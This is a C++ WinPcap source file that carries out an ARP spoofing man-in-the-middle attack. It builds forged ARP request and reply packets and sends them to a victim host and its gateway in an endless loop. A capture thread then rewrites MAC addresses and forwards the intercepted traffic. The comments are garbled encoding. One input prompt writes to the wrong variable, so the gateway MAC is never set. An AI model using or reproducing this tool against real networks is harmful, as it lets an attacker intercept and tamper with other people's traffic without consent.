//arp_best

#include "stdafx.h"
#define _XKEYCHECK_H
#define HAVE_REMOTE
#include <stdio.h>
#include "pcap.h"
#include "remote-ext.h"
#include <Packet32.h>
#include "arp_struct.h"
#include <iostream>
using namespace std;

#pragma warning(disable:4996)


char  cheatip[20];
char  wgip[20];
char  wgmac[20];
char  cheatmac[20];
char  mymac[20];
unsigned char  wgmacchar[20];
unsigned char  cheatmacchar[20];
unsigned char  mymacchar[20];

typedef struct ether_header {
	u_char ether_dhost[6];      // Ŀ���ַ  
	u_char ether_shost[6];      // Դ��ַ  
	u_short ether_type;         // ��̫������  
}ether_header;


HANDLE thread;
CRITICAL_SECTION print_cs;

char packet_filter[256] = "tcp port http";

// �����̺߳���
DWORD WINAPI CaptureAndForwardThread(LPVOID lpParameter);
// ����֪ͨת���߳���ֹ��ȫ�ֱ��� 
volatile int kill_forwaders = 0;

void tomac(unsigned char * machex, char mac[])
{
	int v, i;
	for (i = 0; i<6; i++) {
		sscanf(mac + 2 * i, "%2x", &v);
		machex[i] = (unsigned char)v;
	}
}

unsigned char charToData(const char ch) {
	if (ch > 47 && ch < 58) {
		return ch - 48;
	}
	if (ch>64 && ch < 71) {
		return ch - 55;
	}
	if (ch>96 && ch < 103) {
		return ch - 87;
	}
	return 0;
}
bool GetMacAddr(const char *chsMac, unsigned char *chdMac) {
	const char *pTemp = chsMac;
	for (int i = 0; i < 6; i++) {
		chdMac[i] = charToData(*pTemp++) * 16;
		chdMac[i] += charToData(*pTemp++);
	}
	return true;
}
void enArpReqPack(Arp_Packet *arp, char *chLocalMac, char *chLocalIp, char *chDstMac, char *chDstIp, bool is_request) {
	//��ʼ��arp�ṹ��
	memset(arp, 0, sizeof(Arp_Packet));
	//�������֡��Ŀ��MAC
	GetMacAddr(chDstMac, arp->eth.dest_mac);
	//�������֡��ԴMAC
	GetMacAddr(chLocalMac, arp->eth.source_mac);
	//�������֡������
	arp->eth.eh_type = htons(EH_TYPE);
	//���Ӳ������
	arp->arp.hardware_type = htons(HRD_TYPE);
	//����ϲ�Э������
	arp->arp.protocol_type = htons(PRO_TYPE);
	//���arp����MACӲ����ַ����
	arp->arp.add_len = MAC_LEN;
	//���arp����IP��ַ����
	arp->arp.pro_len = IP_LEN;
	//���arp֡ԴMAC
	GetMacAddr(chLocalMac, arp->arp.sour_addr);
	//���arp֡ԴIP
	arp->arp.sour_ip = inet_addr(chLocalIp);
	//���arp֡Ŀ��IP
	arp->arp.dest_ip = inet_addr(chDstIp);
	//�������
	if (is_request) {
		//����������ʶ���������arp֡Ŀ��MAC��Ŀ��MACȫΪ0����ʾ�����䣩
		arp->arp.option = htons(ARP_REQUEST);
	}
	//��Ӧ���
	else {
		//���Ӧ�����ʶ
		arp->arp.option = htons(ARP_REPLY);
		//���arp֡Ŀ��MAC
		GetMacAddr(chDstMac, arp->arp.dest_addr);
	}
}

int main() {

	cout << "��������Ҫ��ƭ��IP:" << endl;
	cin >> cheatip;
	//strcpy(cheatip, "192.168.43.154");

	cout << "���������ص�IP:" << endl;
	cin >> wgip;
	//strcpy(wgip, "192.168.43.1");

	cout << "���������ص�Mac:" << endl;
	cin >> wgip;
	//strcpy(wgmac, "38bc1a969214");

	cout << "��������ƭ��Mac:" << endl;
	cin >> cheatmac;
	//strcpy(cheatmac, "08d8334015ff");

	cout << "�����뱾��Mac:" << endl;
	cin >> mymac;
	//strcpy(mymac, "8056f2e73135");


	tomac(cheatmacchar, cheatmac);
	tomac(mymacchar, mymac);
	tomac(wgmacchar, wgmac);

	int i = 0, inum;
	Arp_Packet arp_to_gateway = { 0 };//�����߷�������,IPΪ������IP,MACΪ�ܺ���MAC,����Ϊ����
	Arp_Packet arp_to_victim = { 0 };//�����߷����ܺ���,IPΪ������IP,MACΪ����MAC,����ΪӦ��
	pcap_if_t *alldevs, *d;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	char szPktBuf[1024], szPktBuff[1024];
	//��ȡ���е������ӿ�
	pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf);
	//��ʾ���е������ӿ��Թ�ѡ��
	for (d = alldevs; d; d = d->next) {
		printf("%d. %s %x\n", ++i, d->description, unsigned int(d->addresses));
	}
	//ѡ����Ӧ�������ӿ�
	printf("Enter the interface number(1-%d):", i);
	scanf("%d", &inum);
	//��ѡ�е������ӿ�
	for (d = alldevs, i = 0; i < inum - 1; i++, d = d->next);

	adhandle = pcap_open(d->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);

	//�����߷�������,IPΪ�ܺ���,MACΪ������,����Ϊ����
	enArpReqPack(&arp_to_gateway,
		mymac,      //ԴMAC��������MAC
		cheatip,     //ԴIP���ܺ���IP
		"ffffffffffff",      //Ŀ��MAC�������ʱ��Ҫ���͹㲥���������FFFFFFFFFFFF������㲥��
		wgip        //Ŀ��IP������IP
		, true);              //��Ϊtrue�������������


							  //�����߷����ܺ���,IPΪ����IP,MACΪ������MAC,����ΪӦ��
	enArpReqPack(&arp_to_victim,
		mymac,      //ԴMAC��������MAC
		wgip,       //ԴIP������IP
		cheatmac,      //Ŀ��MAC���ܺ���MAC
		cheatip      //Ŀ��IP���ܺ���
		, false);             //��Ϊfalse��������Ӧ���


							  //��arp�ṹ������ݸ��Ƶ��ֽ������У����㷢��
	memcpy(szPktBuf, (char*)&arp_to_gateway, sizeof(Arp_Packet));
	memcpy(szPktBuff, (char*)&arp_to_victim, sizeof(Arp_Packet));
	//pcap_sendpacket(adhandle, (const u_char*)szPktBuf, sizeof(Arp_Packet));
	//ʹ��ѭ�����ϵķ���arp��ƭ�����Ӷ���û������arp����



	if ((thread = CreateThread(NULL, 0, CaptureAndForwardThread, adhandle, 0, NULL)) == NULL)
	{
		fprintf(stderr, "�����ذ������߳�ʧ��.");
		// �ر�����
		pcap_close(adhandle);
		// �ͷ��豸�б�
		pcap_freealldevs(alldevs);
		return -1;
	}

	while (true) {
		//����arp���ݰ����ܺ���
		if (pcap_sendpacket(adhandle, (const u_char*)szPktBuff, sizeof(Arp_Packet)) != 0) {
			printf("Error sending the packet:%s\n", pcap_geterr(adhandle));
			return -1;
		}
		//����arp���ݰ�������
		if (pcap_sendpacket(adhandle, (const u_char*)szPktBuf, sizeof(Arp_Packet)) != 0) {
			printf("Error sending the packet:%s\n", pcap_geterr(adhandle));
			return -1;
		}
		/*******************************/

		//��ʱ
		Sleep(100);
		printf("����ARP��ƭ�����С�����\n");
	}
	//ɨβ
	pcap_freealldevs(alldevs);
	pcap_close(adhandle);
	return 0;
}


/*******************************************************************
* ת���߳�
*******************************************************************/
DWORD WINAPI CaptureAndForwardThread(LPVOID lpParameter)
{
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int res = 0;
	pcap_t * adhandle = (pcap_t *)lpParameter;
	unsigned int n_fwd = 0;
	u_char MAC[20] = "";

	// ��ȡ��������
	/*printf("\n������������������û�й����������밴�س�������");

	fgets(packet_filter, sizeof(packet_filter), stdin);*/



	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0)
	{
		char newdata[65535] = "";
		if (res != 0)	// res=0 �������ʱʱ�䵽
		{
			memcpy(newdata, pkt_data, header->caplen);
			if (memcmp(newdata + 6, cheatmacchar, 6) == 0)
			{
				if (memcmp(newdata, mymacchar, 6) == 0)
				{
					memcpy(newdata + 6, mymacchar, 6);
					memcpy(newdata, wgmacchar, 6);
				}
			}
			if (memcmp(newdata + 6, wgmacchar, 6) == 0)
			{
				if (memcmp(newdata, mymacchar, 6) == 0)
				{
					memcpy(newdata + 6, mymacchar, 6);
					memcpy(newdata, cheatmacchar, 6);
				}
			}
			// ���ͽ��յ������ݱ���
			if (pcap_sendpacket(adhandle, (const unsigned char *)newdata, header->caplen) != 0)
			{
				EnterCriticalSection(&print_cs);

				printf("Error sending a %u bytes packets on interface : %s\n",
					header->caplen,
					pcap_geterr(adhandle));

				LeaveCriticalSection(&print_cs);
			}
			else
			{
				n_fwd++;
			}
		}

		Sleep(100);
	}

	/**************************** �˳�ѭ��������˳�ԭ��ͳ��״̬************************************/
	if (res < 0)
	{
		EnterCriticalSection(&print_cs);

		printf("Error capturing the packets: %s\n", pcap_geterr(adhandle));
		fflush(stdout);

		LeaveCriticalSection(&print_cs);
	}
	else
	{
		EnterCriticalSection(&print_cs);

		printf("End of bridging on interface . Forwarded packets:%u\n",
			n_fwd);
		fflush(stdout);

		LeaveCriticalSection(&print_cs);
	}

	return 0;
}
